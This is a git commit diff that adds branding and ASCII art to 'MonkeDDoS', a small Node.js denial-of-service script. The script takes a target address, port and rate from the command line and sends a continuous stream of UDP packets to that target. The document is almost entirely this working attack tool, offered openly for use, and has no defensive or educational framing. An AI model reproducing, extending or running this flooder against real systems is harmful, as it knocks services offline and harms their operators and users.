f4b0d410365a5e4baf5ec4e682b2ea05bea8544a
SxlentGE <107578977+SxlentGE@users.noreply.github.com>
2023-05-07 23:28:48 +0400

    Added new sexy index.js
    Meee and my monkeee

--- index.js
+++ index.js
@@ -1,22 +1,85 @@
 const dgram = require('dgram');
+
 const client = dgram.createSocket('udp4');
 
 const args = process.argv;
 
 const address = args[2]
+
 const port = args[3]
 
 const times = args[4] ?? 1000
 
 if(!address || !port)
-  return console.log('[ERROR] Use: \'node . <address> <port> [<times>]\'')
+
+  return console.log(`
+
+..................................................
+
+..................................................
+
+..................................................
+
+..................................................
+
+.....................................''''''.......
+
+.....................................''''''.......
+
+....';;;;;;;;;;;;,............,;;;;;;::::::,......
+
+'''';ddddddddddddl............:ddddddddddddc.....'
+
+'''';ddddddddddddl............:ddddddddddddc.....'
+
+....;ddddddkOOOOOd,,,,,,;;;;;;lOOOOOOxdddddc.....'
+
+....,ddddddNMMMMMXdddddddddddd0MMMMMMkdddddc......
+
+....,ddddddNMMMMMXdddddddddddd0MMMMMMkdddddc.....'
+
+....,dddddd0KKKKKOooooooooooooxKKKKKKxdddddc.....'
+
+....;dddddd.     .;;;;;;;;;;;;.      ldddddc.....'
+
+....;dddddd.     .;;;;;;;;;;;;.      ldddddc.....'
+
+,,,,cxxxxxx'.....'cccccccccccc,......oxxxxxl,,,,,;
+
+OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOkkkkkx
+
+OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOkkkkkx
+
+OOOOOkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx
+
+0000d......................................:00000O
+
+0000d......................................:00000O
+
+0000d......................................:00000O
+
+OOOOOkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkOOOOOOk
+
+OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOk
+
+OOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOk
+
+--------MonkeDDoS ----> Version 1.0 BETA-------- \n -------Author: id4l#2978-----------
+
+  `);
 
 client.on('error', (e) => {
+
   console.log('[ERROR]: ' + e)
+
   process.kill(process.pid);
+
 })
 
 setInterval(() => {
+
     client.send('', 0, 0, port, address);
-    console.log(`[DDoS by id4l] Sending packets to ${address}:${port}...`)
+
+    console.log(`[MonkeDDoS] Sending packets to ${address}:${port}...`)
+
 }, (1000 / (times <= 0 ? 1000 : times)))
